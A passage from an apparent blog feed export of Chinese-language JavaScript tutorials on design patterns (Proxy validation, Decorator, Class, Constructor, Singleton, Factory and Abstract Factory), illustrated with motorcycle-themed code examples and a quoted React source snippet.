class="keyword">let</span> validator = &#123;</span><br><span class="line">  <span class="attr">set</span>: <span class="keyword">function</span> (<span class="params">obj, prop, value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="string">&quot;age&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(value)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;The age is not an integer&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RangeError</span>(<span class="string">&quot;The age seems invalid&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">18</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Can ride motorcycle with license&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The default behavior to store the value</span></span><br><span class="line">    obj[prop] = value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Indicate success</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, validator);</span><br><span class="line"></span><br><span class="line">person.<span class="property">age</span> = <span class="number">100</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">age</span>); <span class="comment">// 100</span></span><br><span class="line">person.<span class="property">age</span> = <span class="string">&quot;young&quot;</span>; <span class="comment">// Throws an TypeError exception</span></span><br><span class="line">person.<span class="property">age</span> = <span class="number">300</span>; <span class="comment">// Throws an RangeError exception</span></span><br></pre></td></tr></table></figure><h2 id="Decorator-Pattern"><a href="#Decorator-Pattern" class="headerlink" title="Decorator Pattern"></a>Decorator Pattern</h2><p>Decorator Pattern 可以在不改變原有程式碼的情況下，動態幫物件新增額外的功能。</p><p>這種模式通常是利用繼承來實現的，但是裝飾者模式強調的是可以在執行時期加上額外的功能，而不是在編譯時期就固定下來。</p><p>可以想像成一杯咖啡（被裝飾者）可以通過添加不同的裝飾物（裝飾者）來增加不同的風味。</p><p>例如，如果想要加牛奶、加糖，這樣咖啡就同時擁有了糖和牛奶。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原有的機車</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = <span class="string">&quot;Basic Motorcycle&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getPrice</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">price</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getDescription</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">description</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改裝後的機車 (裝飾者)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomizedMotorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">motorcycle</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">motorcycle</span> = motorcycle;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getPrice</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">motorcycle</span>.<span class="title function_">getPrice</span>() + <span class="number">1000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getDescription</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">motorcycle</span>.<span class="title function_">getDescription</span>() + <span class="string">&quot; with Customized Parts&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 性能優化的機車 (裝飾者)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HighPerformanceMotorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">motorcycle</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">motorcycle</span> = motorcycle;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getPrice</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">motorcycle</span>.<span class="title function_">getPrice</span>() + <span class="number">2000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getDescription</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">motorcycle</span>.<span class="title function_">getDescription</span>() + <span class="string">&quot; with High Performance Parts&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">let</span> basicMotorcycle = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  basicMotorcycle.<span class="title function_">getDescription</span>() + <span class="string">&quot; costs $&quot;</span> + basicMotorcycle.<span class="title function_">getPrice</span>()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> customizedMotorcycle = <span class="keyword">new</span> <span class="title class_">CustomizedMotorcycle</span>(basicMotorcycle);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  customizedMotorcycle.<span class="title function_">getDescription</span>() +</span><br><span class="line">    <span class="string">&quot; costs $&quot;</span> +</span><br><span class="line">    customizedMotorcycle.<span class="title function_">getPrice</span>()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> highPerformanceMotorcycle = <span class="keyword">new</span> <span class="title class_">HighPerformanceMotorcycle</span>(</span><br><span class="line">  customizedMotorcycle</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  highPerformanceMotorcycle.<span class="title function_">getDescription</span>() +</span><br><span class="line">    <span class="string">&quot; costs $&quot;</span> +</span><br><span class="line">    highPerformanceMotorcycle.<span class="title function_">getPrice</span>()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在 TypeScript 中，Decorator 是一個 function, 透過在 class&#x2F;parameter&#x2F;method&#x2F;property 前面加上 @ 來使用，這種寫法在 Angular 中被大量使用。</p><p>參考資料: <a href="https://www.typescriptlang.org/docs/handbook/decorators.html">https://www.typescriptlang.org/docs/handbook/decorators.html</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@angular/core&quot;</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">Component</span>(&#123;</span><br><span class="line">  <span class="attr">selector</span>: <span class="string">&quot;hello-world&quot;</span>,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Hello World&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;This is my first component!&lt;/p&gt;</span></span><br><span class="line"><span class="string">  `</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">HelloWorldComponent</span> &#123;</span><br><span class="line">  <span class="comment">// The code in this class drives the component&#x27;s behavior.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Creational Pattern</title>
      <link href="/2023/02/25/js-pattern/js-creational-pattern/"/>
      <url>/2023/02/25/js-pattern/js-creational-pattern/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會以 JavaScript 的 Creational Pattern 開始介紹，建立型模式是處理物件建立的設計模式，實作上會根據實際情況使用合適的方式建立物件，幾種方式如下</p><ul><li>Class Design Pattern</li><li>Constructor Pattern</li><li>Singleton Pattern</li><li>Factory Pattern</li><li>Abstract Factory Pattern</li></ul><p>Design Patterns 依照目的分成三群：</p><ul><li><a href="https://linyencheng.github.io/2023/02/25/js-pattern/js-creational-pattern/">Creational Patterns 創建型</a></li><li>Structural Patterns 結構型，結構型設計模式根據實際情況會分成三種:<ul><li><a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a></li><li><a href="https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">優化程式碼結構</a></li><li><a href="https://linyencheng.github.io/2023/05/30/js-pattern/js-structure-pattern-for-project/">優化專案結構</a></li></ul></li><li><a href="https://linyencheng.github.io/2023/06/30/js-pattern/js-behavioral-pattern/">Behavioural Patterns 行為型</a></li></ul><h2 id="Class-Design-Pattern"><a href="#Class-Design-Pattern" class="headerlink" title="Class Design Pattern"></a>Class Design Pattern</h2><p>這個其實算常見，基於 prototype 的基礎在 ECMAScript 6 被實作，讓我們可以用模擬物件導向方式去建立物件。</p><p>Class 是一個定義檔，去定義出 “未來產生的” 物件應該要長什麼樣子以及該怎麼被使用。</p><p>在使用 Class 時必須使用 new 這個關鍵字用 Class 去產生出新的 Instance 作為物件來被使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> motor125 = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, <span class="number">125</span>);</span><br><span class="line"><span class="keyword">const</span> motor50 = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, <span class="number">50</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motor125);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motor50);</span><br></pre></td></tr></table></figure><p>執行程式碼的結果</p><blockquote><p>Motorcycle {license: ‘white’, volume: 125}<br>Motorcycle {license: ‘white’, volume: 50}</p></blockquote><h3 id="Constructor-Pattern"><a href="#Constructor-Pattern" class="headerlink" title="Constructor Pattern"></a>Constructor Pattern</h3><p>以 Class Design Pattern 延伸出的就是 Constructor Pattern，讓我們可以沿用父類別 constructor 已經定義過的變數和沿用該變數該有的行為。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SymMotor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(license, volume);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = <span class="string">&quot;sym&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> symMotorGreenLicense = <span class="keyword">new</span> <span class="title class_">SymMotor</span>(<span class="string">&quot;green&quot;</span>, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">const</span> symMotorWhiteLicense = <span class="keyword">new</span> <span class="title class_">SymMotor</span>(<span class="string">&quot;white&quot;</span>, <span class="number">125</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symMotorGreenLicense);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(symMotorWhiteLicense);</span><br></pre></td></tr></table></figure><p>執行程式碼的結果</p><blockquote><p>SymMotor {license: ‘green’, volume: 50, brand: ‘sym’}<br>SymMotor {license: ‘white’, volume: 125, brand: ‘sym’}</p></blockquote><p>React 初期的 class component 就是運用這個來實作出元件，super 會參照父類別的 constructor，並且要在呼叫過後才可以叫用 this，所以我們可以去使用已經在父類別裡面已經被定義過的 props，以 Motorcycle 當例子就是 license 和 volume 都已經被定義過且被使用。</p><p>如果在寫 Super 前就先使用 this 去定義 function 若 function 有使用到 props 的內容就會造成未定義的問題，所以在 constructor 中使用 this，JavaScript 強制必須先呼叫 super。</p><p>那為什麼要寫一個 <code>super(props);</code> 當參數，原因就在 <a href="https://github.com/facebook/react/blob/6b3083266686f62b29462d32de75c6e71f7ba3e3/packages/react/src/ReactBaseClasses.js#L20">React 原始碼</a>裡。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Base class helpers for the updating state of a component.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params">props, context, updater</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">props</span> = props;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">context</span> = context;</span><br><span class="line">  <span class="comment">// If a component has string refs, we will assign a different object later.</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">refs</span> = emptyObject;</span><br><span class="line">  <span class="comment">// We initialize the default updater but the real one gets injected by the</span></span><br><span class="line">  <span class="comment">// renderer.</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">updater</span> = updater || <span class="title class_">ReactNoopUpdateQueue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Component</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">isReactComponent</span> = &#123;&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class-based</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Input</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">handleInputInit</span>(); <span class="comment">// 不被允許</span></span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">input</span>: <span class="string">&quot;&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleInput</span> = <span class="variable language_">this</span>.<span class="property">handleInput</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleInputInit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 以 Motorcycle 來說這裡就會看不到 license 和 volume</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleInput</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">input</span>: e.<span class="property">target</span>.<span class="property">value</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;handleInput&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.input&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Singleton-Pattern"><a href="#Singleton-Pattern" class="headerlink" title="Singleton Pattern"></a>Singleton Pattern</h2><p>單體模式算是小編接觸的第一個設計模式，目標很清楚就是要持久化一個物件，當未來每次要產生物件時其實都是使用同一個 Instance 的物件內容。</p><p>不過較常使用在後端，讓用於資料庫連線的物件只會有一個。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> instance = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (instance) <span class="keyword">return</span> instance;</span><br><span class="line">    <span class="keyword">if</span> (!instance) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">      instance = <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> motor125 = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, <span class="number">125</span>);</span><br><span class="line"><span class="keyword">const</span> motor50 = <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, <span class="number">50</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motor125);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motor50);</span><br></pre></td></tr></table></figure><p>執行程式的結果可以發現都是相同物件的內容，新的 new 其實並沒有產生新的物件出來。</p><blockquote><p>Motorcycle {license: ‘white’, volume: 125}<br>Motorcycle {license: ‘white’, volume: 125}</p></blockquote><h2 id="Factory-Pattern"><a href="#Factory-Pattern" class="headerlink" title="Factory Pattern"></a>Factory Pattern</h2><p>工廠模式顧名思義就是去定義出類似工廠概念的 class，工廠是按照規格把東西做出來。</p><p>所以 Factory Pattern 就會是專注定義規格，並且提供 function 讓使用者可以將物件製造出來。</p><p>底下的例子我們就來定義機車的規格</p><ul><li>50cc 綠牌車</li><li>125cc 白牌車</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定義基礎 Class 一台機車包含牌照及 CC 數</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  2. 定義 Sym 工廠並且定義 createMotor function</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MotorFactory</span> &#123;</span><br><span class="line">  <span class="title function_">createMotor</span>(<span class="params">&#123; volume &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;green&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (volume &lt; <span class="number">150</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Motorcycle</span>(<span class="string">&quot;white&quot;</span>, volume);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立工廠物件</span></span><br><span class="line"><span class="keyword">const</span> motorFactory = <span class="keyword">new</span> <span class="title class_">MotorFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 透過工廠物件生產機車</span></span><br><span class="line"><span class="keyword">const</span> motorGreenLicense = motorFactory.<span class="title function_">createMotor</span>(&#123; <span class="attr">volume</span>: <span class="number">50</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> motorWhiteLicense = motorFactory.<span class="title function_">createMotor</span>(&#123; <span class="attr">volume</span>: <span class="number">125</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motorGreenLicense);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(motorWhiteLicense);</span><br></pre></td></tr></table></figure><p>執行程式碼的結果</p><blockquote><p>Motorcycle {license: ‘green’, volume: 50}<br>Motorcycle {license: ‘white’, volume: 125}</p></blockquote><p>如果要寫出一個 react 版本的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">factory</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> condition = <span class="string">&quot;some condition&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ProductA</span> <span class="attr">params</span>=<span class="string">&#123;params&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ProductB</span> <span class="attr">params</span>=<span class="string">&#123;params&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Abstract-Factory-Pattern"><a href="#Abstract-Factory-Pattern" class="headerlink" title="Abstract Factory Pattern"></a>Abstract Factory Pattern</h2><p>Abstract Factory 只是 Factory Pattern 延伸的概念，以現實狀況來說就是一個代工廠。</p><p>小編現在剛好就在代工廠上班，代工廠做的事情是在某個規格的基礎上，依照各品牌去做相關的客製化做代工，舉例來說常見的鞋子、筆電等等，其實都是由代工廠為各個品牌進行製造的。</p><p>以廣達當作 Abstract Factory 來看，實際的代工出來的就會有 HP、Toshiba、Sony、Lenovo 等等品牌筆電。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定義基礎 Class 一台機車包含牌照及 CC 數</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Motorcycle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">license, volume</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">license</span> = license;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">volume</span> = volume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 定義各品牌</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SymMotor</span> <span class="keyword">extends</span> <span 